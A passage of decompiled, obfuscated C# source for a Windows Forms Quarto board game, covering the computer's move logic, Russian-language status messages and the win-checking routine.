					int num5;
					if (Form1.smethod_41((Control)(object)borderBox[num4, num3]) == Color.Blue)
					{
						num = 2124637081;
						num5 = 2124637081;
					}
					else
					{
						num = 1083798640;
						num5 = 1083798640;
					}
					continue;
				}
				case 9u:
					Paint_Board();
					num = ((int)num2 * -1990703355) ^ 0x62885A7C;
					continue;
				case 8u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 432697670) ^ 0x2691078E);
					continue;
				case 6u:
					num = (int)((num2 * 281068205) ^ 0x1F5A1E1A);
					continue;
				case 5u:
					flag = num4 < 4;
					num = 14897747;
					continue;
				case 4u:
					num = (int)((num2 * 408212018) ^ 0x55D062CE);
					continue;
				case 3u:
					num3++;
					num = 1470092294;
					continue;
				case 2u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = ((int)num2 * -1665916464) ^ 0x27DE6CDA;
					continue;
				case 1u:
					num = (int)((num2 * 1612537047) ^ 0x42FB2BF0);
					continue;
				case 0u:
					num3 = 0;
					num = 1695809171;
					continue;
				default:
					return;
				case 7u:
					break;
				case 11u:
					return;
					IL_0132:
					num = 1901475728;
					num6 = 1901475728;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_0413: Unknown result type (might be due to invalid IL or missing references)
		//IL_0441: Expected O, but got Unknown
		Form1.smethod_7((Control)(object)button2, bool_0: false);
		if (Form1.smethod_46((Control)(object)pictureBox1))
		{
			goto IL_0f50;
		}
		goto IL_17c7;
		IL_17c7:
		step++;
		Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
		int num = 1306804657;
		goto IL_14f5;
		IL_14f5:
		int num29 = default(int);
		bool flag10 = default(bool);
		bool flag12 = default(bool);
		int num30 = default(int);
		int num21 = default(int);
		bool flag21 = default(bool);
		bool flag14 = default(bool);
		int num5 = default(int);
		int num16 = default(int);
		int num17 = default(int);
		int num33 = default(int);
		int num32 = default(int);
		bool flag5 = default(bool);
		bool flag11 = default(bool);
		Figurine[,] array3 = default(Figurine[,]);
		bool flag19 = default(bool);
		int num27 = default(int);
		int num13 = default(int);
		int num45 = default(int);
		int num46 = default(int);
		int num31 = default(int);
		int num41 = default(int);
		Figurine[,] array2 = default(Figurine[,]);
		bool flag16 = default(bool);
		int num22 = default(int);
		int num23 = default(int);
		bool flag2 = default(bool);
		int num8 = default(int);
		bool flag9 = default(bool);
		int num18 = default(int);
		int num28 = default(int);
		bool flag20 = default(bool);
		bool flag8 = default(bool);
		int num14 = default(int);
		Figurine[,] array = default(Figurine[,]);
		Graphics graphics_ = default(Graphics);
		bool flag17 = default(bool);
		int num15 = default(int);
		bool flag7 = default(bool);
		bool flag18 = default(bool);
		bool flag15 = default(bool);
		bool flag13 = default(bool);
		bool flag3 = default(bool);
		bool flag6 = default(bool);
		bool flag4 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			uint num2;
			int num34;
			int num26;
			int num42;
			int num67;
			switch ((num2 = (uint)num ^ 0x48C3F539u) % 175u)
			{
			case 174u:
				num29++;
				num = (int)((num2 * 63183969) ^ 0x15B1BE2);
				continue;
			case 172u:
				num = (int)(num2 * 429497157) ^ -88105789;
				continue;
			case 171u:
				Form1.smethod_15(timer1);
				num = ((int)num2 * -2144519770) ^ -779040955;
				continue;
			case 170u:
			{
				int num53;
				int num54;
				if (!flag10)
				{
					num53 = 277502841;
					num54 = 277502841;
				}
				else
				{
					num53 = 1127947820;
					num54 = 1127947820;
				}
				num = num53 ^ ((int)num2 * -967004991);
				continue;
			}
			case 169u:
				flag12 = num30 < 4;
				num = 307245136;
				continue;
			case 168u:
				num21++;
				num = (int)((num2 * 1307446276) ^ 0x29B1AA38);
				continue;
			case 167u:
			{
				int num59;
				int num60;
				if (flag21)
				{
					num59 = 101336512;
					num60 = 101336512;
				}
				else
				{
					num59 = 570946940;
					num60 = 570946940;
				}
				num = num59 ^ (int)(num2 * 399405447);
				continue;
			}
			case 166u:
				num = ((int)num2 * -691778735) ^ -1721709053;
				continue;
			case 164u:
				num = ((int)num2 * -312702857) ^ -1762317184;
				continue;
			case 163u:
				Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
				num = ((int)num2 * -1063277299) ^ -646621308;
				continue;
			case 162u:
			{
				int num37;
				int num38;
				if (flag14)
				{
					num37 = 342385047;
					num38 = 342385047;
				}
				else
				{
					num37 = 1730755335;
					num38 = 1730755335;
				}
				num = num37 ^ ((int)num2 * -1064648968);
				continue;
			}
			case 161u:
				num = ((int)num2 * -712976932) ^ -1302242506;
				continue;
			case 160u:
				num5++;
				num = 111717417;
				continue;
			case 159u:
				num = (int)(num2 * 276120450) ^ -1629795209;
				continue;
			case 158u:
				num = (int)((num2 * 2139936534) ^ 0x7D3E0190);
				continue;
			case 157u:
				num = ((int)num2 * -307461526) ^ 0x66E3FFC1;
				continue;
			case 156u:
				Form1.smethod_20(pictureBox[num16, num17], (Image)null);
				num = ((int)num2 * -681964522) ^ 0x703F9839;
				continue;
			case 155u:
				num = (int)((num2 * 1738786371) ^ 0x35A46162);
				continue;
			case 154u:
				num = (int)(num2 * 2045235280) ^ -803250540;
				continue;
			case 153u:
				Form1.smethod_30((Control)(object)borderBox[num33, num32]);
				Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
				num = (int)((num2 * 2088462572) ^ 0x9C5A520);
				continue;
			case 152u:
				Form1.smethod_30((Control)(object)pictureBox1);
				num = ((int)num2 * -793628142) ^ 0x37DE9E84;
				continue;
			case 151u:
			{
				int num63;
				int num64;
				if (!flag5)
				{
					num63 = 475604234;
					num64 = 475604234;
				}
				else
				{
					num63 = 1405542442;
					num64 = 1405542442;
				}
				num = num63 ^ (int)(num2 * 143754814);
				continue;
			}
			case 150u:
				flag11 = Standoff(board);
				num = 812822922;
				continue;
			case 149u:
				step++;
				num = (int)(num2 * 490177398) ^ -145390621;
				continue;
			case 148u:
			{
				int num55;
				int num56;
				if (!Stop(array3))
				{
					num55 = -1798023459;
					num56 = -1798023459;
				}
				else
				{
					num55 = -893739703;
					num56 = -893739703;
				}
				num = num55 ^ ((int)num2 * -1197747177);
				continue;
			}
			case 147u:
			{
				int num49;
				int num50;
				if (!flag19)
				{
					num49 = 778601724;
					num50 = 778601724;
				}
				else
				{
					num49 = 445420244;
					num50 = 445420244;
				}
				num = num49 ^ ((int)num2 * -37013695);
				continue;
			}
			case 146u:
				num27 = 0;
				num = (int)(num2 * 984907605) ^ -1153997838;
				continue;
			case 145u:
				num13 = 0;
				num = 510064084;
				continue;
			case 144u:
				num = ((int)num2 * -1117816821) ^ 0x5AD3E838;
				continue;
			case 143u:
				board[num45, num46] = new Figurine(storage[num31, num41]);
				storage[num31, num41] = null;
				num = (int)((num2 * 1612466226) ^ 0x3547535B);
				continue;
			case 142u:
				Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
				num = 1479657297;
				continue;
			case 141u:
				array2 = (Figurine[,])Form1.smethod_48((Array)board);
				num = (int)(num2 * 885800182) ^ -600237172;
				continue;
			case 140u:
				num31 = num29;
				num41 = num30;
				num = ((int)num2 * -553696651) ^ -124168299;
				continue;
			case 139u:
				num16 = num21;
				num = (int)(num2 * 553249764) ^ -843316218;
				continue;
			case 138u:
				flag16 = Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num30 * size + size / 2, (int)(((float)num29 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0);
				num = 2022513963;
				continue;
			case 137u:
				if (num33 == num16)
				{
					num = (int)(num2 * 914734457) ^ -169656991;
					continue;
				}
				num34 = 0;
				goto IL_047d;
			case 136u:
				Form1.smethod_5((Control)(object)borderBox[num21, num13], Color.LimeGreen);
				num = ((int)num2 * -527412157) ^ 0x4056D76A;
				continue;
			case 135u:
				Form1.smethod_15(timer1);
				(menu as Form3).ContinueLock();
				num = 772610805;
				continue;
			case 134u:
				num26 = ((num27 < 9) ? 1 : 0);
				goto IL_04e0;
			case 133u:
				Form1.smethod_30((Control)(object)borderBox[num21, num13]);
				num = ((int)num2 * -288358570) ^ -1219595138;
				continue;
			case 132u:
				num = (int)(num2 * 1618622782) ^ -925646231;
				continue;
			case 131u:
				break;
			case 130u:
				board[num22, num23] = new Figurine(storage[num16, num17]);
				num = (int)(num2 * 145075365) ^ -504986008;
				continue;
			case 129u:
				num = (int)((num2 * 693475416) ^ 0x78945478);
				continue;
			case 128u:
				flag5 = num13 < 4;
				num = 462380225;
				continue;
			case 127u:
				num = 1183459129;
				continue;
			case 126u:
			{
				int num6;
				int num7;
				if (flag2)
				{
					num6 = 647901807;
					num7 = 647901807;
				}
				else
				{
					num6 = 1780126287;
					num7 = 1780126287;
				}
				num = num6 ^ (int)(num2 * 2140578896);
				continue;
			}
			case 125u:
				flag2 = num5 < 4;
				num = 2076862295;
				continue;
			case 124u:
				num8++;
				num = 988065524;
				continue;
			case 123u:
				Form1.smethod_5((Control)(object)borderBox[num16, num17], Color.White);
				num = (int)((num2 * 876513321) ^ 0x2123F922);
				continue;
			case 122u:
			{
				int num68;
				int num69;
				if (!flag9)
				{
					num68 = 1613055845;
					num69 = 1613055845;
				}
				else
				{
					num68 = 1395454682;
					num69 = 1395454682;
				}
				num = num68 ^ (int)(num2 * 1749159916);
				continue;
			}
			case 121u:
				flag14 = num18 < 4;
				num = 1455894208;
				continue;
			case 120u:
				flag19 = Form1.smethod_41((Control)(object)borderBox[num29, num30]) == Color.Blue;
				num = (int)(num2 * 1757454575) ^ -1702167304;
				continue;
			case 119u:
				storage[num16, num17] = null;
				Form1.smethod_5((Control)(object)borderBox[num33, num32], Color.Blue);
				num = (int)(num2 * 1411014034) ^ -996350006;
				continue;
			case 118u:
				num = (int)((num2 * 1744327095) ^ 0x2AAA8AA);
				continue;
			case 117u:
				num28 = 0;
				num = 959007855;
				continue;
			case 116u:
				(menu as Form3).ContinueLock();
				num = (int)(num2 * 1732310987) ^ -1484520204;
				continue;
			case 115u:
				num = (int)(num2 * 1772350986) ^ -54660238;
				continue;
			case 114u:
				flag20 = num21 < 4;
				num = 114473541;
				continue;
			case 113u:
				num = 366993118;
				continue;
			case 112u:
				num = ((int)num2 * -1889377036) ^ -527808853;
				continue;
			case 111u:
				Form1.smethod_30((Control)(object)pictureBox1);
				num = ((int)num2 * -1503186492) ^ 0x5382B06;
				continue;
			case 110u:
				storage[num16, num17] = null;
				flag8 = Standoff(board);
				num = ((int)num2 * -1556608407) ^ 0x1FBF75BD;
				continue;
			case 109u:
				num14++;
				num = ((int)num2 * -2025534703) ^ 0x8C04F47;
				continue;
			case 108u:
				num46 = num30;
				num = (int)((num2 * 654804387) ^ 0x13B3356D);
				continue;
			case 107u:
				num = (int)(num2 * 739487234) ^ -1481852381;
				continue;
			case 106u:
				num = 1274769868;
				continue;
			case 105u:
				num = ((int)num2 * -292756007) ^ 0x2EF32D30;
				continue;
			case 104u:
				if (!Stop(board))
				{
					num = (int)((num2 * 228388427) ^ 0x2D8A635);
					continue;
				}
				num42 = 0;
				goto IL_0821;
			case 103u:
				num30 = 0;
				num = 1356302455;
				continue;
			case 102u:
				num18++;
				num = ((int)num2 * -1592876311) ^ 0x645D955C;
				continue;
			case 101u:
				num = (int)(num2 * 20351687) ^ -208095740;
				continue;
			case 100u:
				num67 = (Standoff(array) ? 1 : 0);
				goto IL_086e;
			case 99u:
				if (!Stop(array))
				{
					num = (int)((num2 * 1341564039) ^ 0x35B85819);
					continue;
				}
				num67 = 1;
				goto IL_086e;
			case 98u:
				num = ((int)num2 * -2050489994) ^ 0x5B9E10B7;
				continue;
			case 97u:
				num = (int)((num2 * 721777002) ^ 0x5AE68BC2);
				continue;
			case 96u:
				board[num14, num5] = new Figurine(storage[num16, num17]);
				num = ((int)num2 * -1178809169) ^ 0x7B9941D5;
				continue;
			case 95u:
				Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num5 + 0.05f) * (float)size, ((float)num14 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
				num = ((int)num2 * -315790224) ^ -732029438;
				continue;
			case 94u:
			{
				int num65;
				int num66;
				if (!flag12)
				{
					num65 = 1007096985;
					num66 = 1007096985;
				}
				else
				{
					num65 = 1552800945;
					num66 = 1552800945;
				}
				num = num65 ^ (int)(num2 * 2021119985);
				continue;
			}
			case 93u:
				num = (int)(num2 * 204752162) ^ -1380808318;
				continue;
			case 92u:
				Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
				num = (int)(num2 * 267793737) ^ -29842290;
				continue;
			case 91u:
				num = (int)(num2 * 1593746047) ^ -1665152725;
				continue;
			case 90u:
				num = ((int)num2 * -1277587604) ^ 0x57F1BA04;
				continue;
			case 89u:
				Form1.smethod_30((Control)(object)borderBox[num16, num17]);
				num = (int)(num2 * 604770078) ^ -1808837067;
				continue;
			case 88u:
				num = 2021929702;
				continue;
			case 87u:
				num34 = ((num32 == num17) ? 1 : 0);
				goto IL_047d;
			case 86u:
			{
				int num61;
				int num62;
				if (!flag16)
				{
					num61 = -1629630820;
					num62 = -1629630820;
				}
				else
				{
					num61 = -84514280;
					num62 = -84514280;
				}
				num = num61 ^ (int)(num2 * 489820740);
				continue;
			}
			case 85u:
				Form1.smethod_30((Control)(object)richTextBox1);
				num = ((int)num2 * -1811234494) ^ 0x3A9CDB6C;
				continue;
			case 84u:
				num = ((int)num2 * -1212395025) ^ 0x1381DFBB;
				continue;
			case 83u:
			{
				int num57;
				int num58;
				if (flag20)
				{
					num57 = -1967926632;
					num58 = -1967926632;
				}
				else
				{
					num57 = -667331166;
					num58 = -667331166;
				}
				num = num57 ^ (int)(num2 * 858369341);
				continue;
			}
			case 82u:
				num = (int)((num2 * 1738293116) ^ 0x2FB620E1);
				continue;
			case 81u:
			{
				int num51;
				int num52;
				if (!flag17)
				{
					num51 = 671610990;
					num52 = 671610990;
				}
				else
				{
					num51 = 569008040;
					num52 = 569008040;
				}
				num = num51 ^ (int)(num2 * 699676816);
				continue;
			}
			case 80u:
				num = (int)((num2 * 223809195) ^ 0x1CA4B6B0);
				continue;
			case 79u:
				num8 = 0;
				num = 1341624971;
				continue;
			case 78u:
				Form1.smethod_20(pictureBox[num16, num17], (Image)null);
				Form1.smethod_30((Control)(object)pictureBox[num16, num17]);
				num = ((int)num2 * -856631722) ^ -1587748551;
				continue;
			case 77u:
				num45 = 0;
				num46 = 0;
				num = (int)((num2 * 1864382707) ^ 0x45BCC97D);
				continue;
			case 76u:
				num22 = Form1.smethod_33(rnd, 4);
				num = ((int)num2 * -490733829) ^ -1574705285;
				continue;
			case 75u:
				num41 = 0;
				num = ((int)num2 * -1354595486) ^ -909119293;
				continue;
			case 74u:
				num = (int)(num2 * 1046174839) ^ -7014701;
				continue;
			case 73u:
				Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
				num = ((int)num2 * -239895849) ^ -1727550706;
				continue;
			case 72u:
				array3 = (Figurine[,])Form1.smethod_48((Array)array2);
				array3[num15, num8] = new Figurine(storage[num33, num32]);
				num = (int)((num2 * 86904671) ^ 0x9EC5760);
				continue;
			case 71u:
				Form1.smethod_5((Control)(object)borderBox[num16, num17], Color.White);
				num = (int)(num2 * 483770915) ^ -1396620645;
				continue;
			case 70u:
				flag7 = num29 < 4;
				num = 700823422;
				continue;
			case 69u:
				num45 = num29;
				num = (int)((num2 * 7743525) ^ 0x7FDE30E7);
				continue;
			case 68u:
				Form1.smethod_47(200);
				num = ((int)num2 * -40163994) ^ 0x68F6ADB5;
				continue;
			case 67u:
				num29 = 0;
				num = ((int)num2 * -621381805) ^ 0x2E26F95;
				continue;
			case 66u:
			{
				int num47;
				int num48;
				if (!flag18)
				{
					num47 = 1941128845;
					num48 = 1941128845;
				}
				else
				{
					num47 = 2031427291;
					num48 = 2031427291;
				}
				num = num47 ^ (int)(num2 * 466847042);
				continue;
			}
			case 65u:
				flag15 = false;
				num = (int)(num2 * 932956144) ^ -707215624;
				continue;
			case 64u:
				num = ((int)num2 * -2049402506) ^ 0x1985E67B;
				continue;
			case 63u:
				Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num16, num17]), num5 * size + 4, num14 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
				num = ((int)num2 * -527464279) ^ -93510900;
				continue;
			case 62u:
				num13++;
				num = ((int)num2 * -1582037458) ^ -364295724;
				continue;
			case 61u:
				num = (int)(num2 * 1593912144) ^ -132733512;
				continue;
			case 60u:
				num = 274176909;
				continue;
			case 59u:
				num33 = Form1.smethod_33(rnd, 4);
				num = 694011675;
				continue;
			case 58u:
				num23 = Form1.smethod_33(rnd, 4);
				num = ((int)num2 * -867472157) ^ -270277041;
				continue;
			case 57u:
			{
				int num43;
				int num44;
				if (!flag13)
				{
					num43 = 27586743;
					num44 = 27586743;
				}
				else
				{
					num43 = 1244311695;
					num44 = 1244311695;
				}
				num = num43 ^ (int)(num2 * 2067333001);
				continue;
			}
			case 56u:
				num = (int)((num2 * 1180949920) ^ 0x10217802);
				continue;
			case 55u:
				num5 = 0;
				num = 111717417;
				continue;
			case 54u:
				flag3 = num8 < 4;
				num = 1982306618;
				continue;
			case 53u:
				Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num16, num17]), num23 * size + 4, num22 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
				num = (int)(num2 * 1789951058) ^ -1013510257;
				continue;
			case 52u:
				num14 = 0;
				num = (int)(num2 * 1480781737) ^ -231413301;
				continue;
			case 51u:
				flag17 = board[num22, num23] != null;
				num = (int)(num2 * 935016731) ^ -1033007363;
				continue;
			case 50u:
				Form1.smethod_30((Control)(object)label2);
				num = ((int)num2 * -207004591) ^ 0x3D8DA923;
				continue;
			case 49u:
				Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
				num = (int)((num2 * 2083573174) ^ 0x1BD7A82E);
				continue;
			case 48u:
				Form1.smethod_30((Control)(object)pictureBox[num16, num17]);
				num = ((int)num2 * -368522151) ^ -1975897423;
				continue;
			case 47u:
				num28++;
				num = (int)(num2 * 1071952514) ^ -1418404232;
				continue;
			case 46u:
				num30++;
				num = 1576846121;
				continue;
			case 45u:
				num42 = ((!Standoff(board)) ? 1 : 0);
				goto IL_0821;
			case 44u:
				num = (int)(num2 * 1964821972) ^ -366009063;
				continue;
			case 43u:
				num = ((int)num2 * -1707308499) ^ -1460596940;
				continue;
			case 42u:
				goto end_IL_14f5;
			case 41u:
				num = 608277764;
				continue;
			case 40u:
				num27++;
				num = 1654063103;
				continue;
			case 39u:
				num = 1514080484;
				continue;
			case 38u:
				Form1.smethod_47(200);
				num = (int)((num2 * 985005008) ^ 0x703D03A);
				continue;
			case 37u:
				flag15 = true;
				num = ((int)num2 * -1810036351) ^ -383223251;
				continue;
			case 36u:
				num = ((int)num2 * -156014149) ^ -255915936;
				continue;
			case 35u:
				Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
				num = ((int)num2 * -1768002577) ^ 0x5B14E461;
				continue;
			case 34u:
			{
				int num39;
				int num40;
				if (!flag6)
				{
					num39 = 1560770129;
					num40 = 1560770129;
				}
				else
				{
					num39 = 1806288786;
					num40 = 1806288786;
				}
				num = num39 ^ ((int)num2 * -1092772016);
				continue;
			}
			case 33u:
				Form1.smethod_30((Control)(object)borderBox[num16, num17]);
				num = ((int)num2 * -1959615754) ^ -312712670;
				continue;
			case 32u:
				array2[num22, num23] = new Figurine(storage[num16, num17]);
				num15 = 0;
				num = ((int)num2 * -1997729423) ^ -1858097490;
				continue;
			case 31u:
				num16 = 0;
				num17 = 0;
				num21 = 0;
				num = ((int)num2 * -818717427) ^ -1885188415;
				continue;
			case 30u:
				if (!flag15)
				{
					num = (int)(num2 * 2005014514) ^ -1211159249;
					continue;
				}
				num26 = 1;
				goto IL_04e0;
			case 29u:
			{
				int num35;
				int num36;
				if (flag11)
				{
					num35 = -1473521000;
					num36 = -1473521000;
				}
				else
				{
					num35 = -1797780779;
					num36 = -1797780779;
				}
				num = num35 ^ (int)(num2 * 1199296353);
				continue;
			}
			case 28u:
				num = (int)((num2 * 1519153093) ^ 0x508DF8C4);
				continue;
			case 27u:
				flag4 = Form1.smethod_41((Control)(object)borderBox[num21, num13]) == Color.Red;
				num = (int)(num2 * 857182169) ^ -700018639;
				continue;
			case 26u:
				graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
				num = ((int)num2 * -1776523331) ^ 0x57B19C9A;
				continue;
			case 25u:
				Form1.smethod_30((Control)(object)borderBox[num29, num30]);
				Form1.smethod_20(pictureBox[num29, num30], (Image)null);
				Form1.smethod_30((Control)(object)pictureBox[num29, num30]);
				num = ((int)num2 * -2018765042) ^ -2090917611;
				continue;
			case 24u:
				num32 = Form1.smethod_33(rnd, 4);
				if (storage[num33, num32] != null)
				{
					num = ((int)num2 * -2110943476) ^ 0x5F63159;
					continue;
				}
				num34 = 1;
				goto IL_047d;
			case 23u:
				Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num23 + 0.05f) * (float)size, ((float)num22 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
				num = ((int)num2 * -1150453381) ^ 0x52D3495C;
				continue;
			case 22u:
				Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
				num = (int)(num2 * 451396314) ^ -1103402527;
				continue;
			case 21u:
				Form1.smethod_47(1000);
				num = ((int)num2 * -766025989) ^ 0x28E45049;
				continue;
			case 20u:
				Form1.smethod_7((Control)(object)pictureBox[num18, num28], bool_0: true);
				num = 1542738575;
				continue;
			case 19u:
				Form1.smethod_7((Control)(object)pictureBox[num21, num13], bool_0: false);
				num = 450099532;
				continue;
			case 18u:
				num31 = 0;
				num = ((int)num2 * -2038628095) ^ 0x18F49096;
				continue;
			case 17u:
				Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
				num = ((int)num2 * -118679827) ^ 0x1EDF9E2;
				continue;
			case 16u:
				goto IL_12d8;
			case 15u:
				Form1.smethod_5((Control)(object)borderBox[num29, num30], Color.White);
				num = ((int)num2 * -2003938746) ^ 0xA371534;
				continue;
			case 14u:
				flag10 = num28 < 4;
				num = 1674709660;
				continue;
			case 13u:
				num = ((int)num2 * -895153963) ^ -716791571;
				continue;
			case 12u:
			{
				int num24;
				int num25;
				if (flag8)
				{
					num24 = 1391650232;
					num25 = 1391650232;
				}
				else
				{
					num24 = 1331952;
					num25 = 1331952;
				}
				num = num24 ^ ((int)num2 * -781295358);
				continue;
			}
			case 11u:
				Paint_Board();
				num = (int)(num2 * 849308770) ^ -197540163;
				continue;
			case 10u:
			{
				int num19;
				int num20;
				if (flag7)
				{
					num19 = -1700970963;
					num20 = -1700970963;
				}
				else
				{
					num19 = -1141013948;
					num20 = -1141013948;
				}
				num = num19 ^ (int)(num2 * 429651006);
				continue;
			}
			case 9u:
				num18 = 0;
				num = ((int)num2 * -1325850902) ^ 0x5E06A955;
				continue;
			case 8u:
				num17 = num13;
				num = (int)((num2 * 959135126) ^ 0x76E58A08);
				continue;
			case 7u:
				array = (Figurine[,])Form1.smethod_48((Array)board);
				num = (int)(num2 * 823811909) ^ -1323179505;
				continue;
			case 6u:
				array[num14, num5] = new Figurine(storage[num16, num17]);
				num = (int)((num2 * 1809648895) ^ 0x5C6313B);
				continue;
			case 5u:
				flag = board[num14, num5] == null;
				num = 347634498;
				continue;
			case 4u:
				num15++;
				num = ((int)num2 * -121236489) ^ 0x68CEE8DC;
				continue;
			case 3u:
				flag6 = num14 < 4;
				num = 1823153048;
				continue;
			case 2u:
			{
				int num11;
				int num12;
				if (flag4)
				{
					num11 = 710971341;
					num12 = 710971341;
				}
				else
				{
					num11 = 1028518419;
					num12 = 1028518419;
				}
				num = num11 ^ (int)(num2 * 796689021);
				continue;
			}
			case 1u:
			{
				int num9;
				int num10;
				if (flag3)
				{
					num9 = -486319178;
					num10 = -486319178;
				}
				else
				{
					num9 = -1645171593;
					num10 = -1645171593;
				}
				num = num9 ^ (int)(num2 * 228903287);
				continue;
			}
			case 0u:
			{
				int num3;
				int num4;
				if (flag)
				{
					num3 = 1198929090;
					num4 = 1198929090;
				}
				else
				{
					num3 = 867273898;
					num4 = 867273898;
				}
				num = num3 ^ ((int)num2 * -1480448228);
				continue;
			}
			default:
				return;
			case 165u:
				goto IL_17c7;
			case 173u:
				return;
				IL_04e0:
				flag9 = (byte)num26 != 0;
				num = 192543165;
				continue;
				IL_047d:
				flag13 = (byte)num34 != 0;
				num = 1680775536;
				continue;
				IL_086e:
				flag18 = (byte)num67 != 0;
				num = 66985805;
				continue;
				IL_0821:
				flag21 = (byte)num42 != 0;
				num = 1475762351;
				continue;
			}
			int num70;
			if (num15 >= 4)
			{
				num = 1367747727;
				num70 = 1367747727;
			}
			else
			{
				num = 183153807;
				num70 = 183153807;
			}
			continue;
			IL_12d8:
			int num71;
			if (array2[num15, num8] != null)
			{
				num = 1514080484;
				num71 = 1514080484;
			}
			else
			{
				num = 1187441160;
				num71 = 1187441160;
			}
			continue;
			end_IL_14f5:
			break;
		}
		goto IL_0f50;
		IL_0f50:
		num = 916405376;
		goto IL_14f5;
	}

	private bool Stop(Figurine[,] mem)
	{
		int num5 = default(int);
		bool flag2 = default(bool);
		bool flag = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = 500533280;
			while (true)
			{
				uint num2;
				int num39;
				int num13;
				switch ((num2 = (uint)num ^ 0x598810C8u) % 76u)
				{
				case 75u:
					if (mem[num5, 2].Point != mem[num5, 3].Point)
					{
						num = ((int)num2 * -1876809641) ^ 0x5AF91BB6;
						continue;
					}
					goto IL_0038;
				case 74u:
					num5++;
					num = (int)(num2 * 1736371199) ^ -564455068;
					continue;
				case 73u:
					if (mem[1, 2] != null)
					{
						num = (int)(num2 * 181999408) ^ -393015556;
						continue;
					}
					goto IL_0088;
				case 72u:
				{
					int num47;
					int num48;
					if (mem[num5, 0].Big == mem[num5, 1].Big)
					{
						num47 = 219491783;
						num48 = 219491783;
					}
					else
					{
						num47 = 1683415350;
						num48 = 1683415350;
					}
					num = num47 ^ ((int)num2 * -1662572941);
					continue;
				}
				case 71u:
				{
					int num68;
					int num69;
					if (mem[num5, 1].Big != mem[num5, 2].Big)
					{
						num68 = -1384177920;
						num69 = -1384177920;
					}
					else
					{
						num68 = -1847804618;
						num69 = -1847804618;
					}
					num = num68 ^ (int)(num2 * 1014322702);
					continue;
				}
				case 70u:
				{
					int num62;
					if (num5 < 4)
					{
						num = 1230695060;
						num62 = 1230695060;
					}
					else
					{
						num = 1817196537;
						num62 = 1817196537;
					}
					continue;
				}
				case 69u:
				{
					int num29;
					int num30;
					if (flag2)
					{
						num29 = 1074095991;
						num30 = 1074095991;
					}
					else
					{
						num29 = 259073758;
						num30 = 259073758;
					}
					num = num29 ^ ((int)num2 * -944087932);
					continue;
				}
				case 68u:
					if (mem[0, num5].Square == mem[1, num5].Square)
					{
						num = 2021872556;
						continue;
					}
					goto IL_0044;
				case 67u:
				{
					int num12;
					if (mem[0, 0].Dark != mem[1, 1].Dark)
					{
						num = 1547646086;
						num12 = 1547646086;
					}
					else
					{
						num = 1126555002;
						num12 = 1126555002;
					}
					continue;
				}
				case 66u:
				{
					int num51;
					int num52;
					if (mem[num5, 1].Point == mem[num5, 2].Point)
					{
						num51 = -497441251;
						num52 = -497441251;
					}
					else
					{
						num51 = -2095277483;
						num52 = -2095277483;
					}
					num = num51 ^ (int)(num2 * 1569301655);
					continue;
				}
				case 65u:
				{
					int num33;
					int num34;
					if (mem[0, 0] != null)
					{
						num33 = 1747459886;
						num34 = 1747459886;
					}
					else
					{
						num33 = 730972475;
						num34 = 730972475;
					}
					num = num33 ^ ((int)num2 * -2097136161);
					continue;
				}
				case 64u:
				{
					int num23;
					int num24;
					if (mem[1, num5].Big == mem[2, num5].Big)
					{
						num23 = 1418627969;
						num24 = 1418627969;
					}
					else
					{
						num23 = 1794050338;
						num24 = 1794050338;
					}
					num = num23 ^ (int)(num2 * 990939149);
					continue;
				}
				case 63u:
				{
					int num70;
					if (mem[num5, 0].Square != mem[num5, 1].Square)
					{
						num = 680894677;
						num70 = 680894677;
					}
					else
					{
						num = 1723344607;
						num70 = 1723344607;
					}
					continue;
				}
				case 62u:
				{
					int num65;
					if (mem[0, num5].Dark == mem[1, num5].Dark)
					{
						num = 991400938;
						num65 = 991400938;
					}
					else
					{
						num = 1483070942;
						num65 = 1483070942;
					}
					continue;
				}
				case 61u:
					if (mem[2, num5].Square == mem[3, num5].Square)
					{
						goto IL_0038;
					}
					goto IL_0044;
				case 60u:
				{
					int num58;
					if (mem[0, 0].Square == mem[1, 1].Square)
					{
						num = 340212940;
						num58 = 340212940;
					}
					else
					{
						num = 1345393044;
						num58 = 1345393044;
					}
					continue;
				}
				case 59u:
					if (mem[num5, 2].Dark != mem[num5, 3].Dark)
					{
						num = (int)(num2 * 2034533428) ^ -1008810498;
						continue;
					}
					goto IL_0038;
				case 58u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = ((int)num2 * -687813678) ^ -1822705176;
						continue;
					}
					goto IL_03a1;
				case 57u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = ((int)num2 * -158703587) ^ 0x375DFD3E;
						continue;
					}
					goto IL_03a1;
				case 56u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = ((int)num2 * -1488659301) ^ -1259429318;
						continue;
					}
					goto IL_03a1;
				case 55u:
					if (mem[num5, 2].Square != mem[num5, 3].Square)
					{
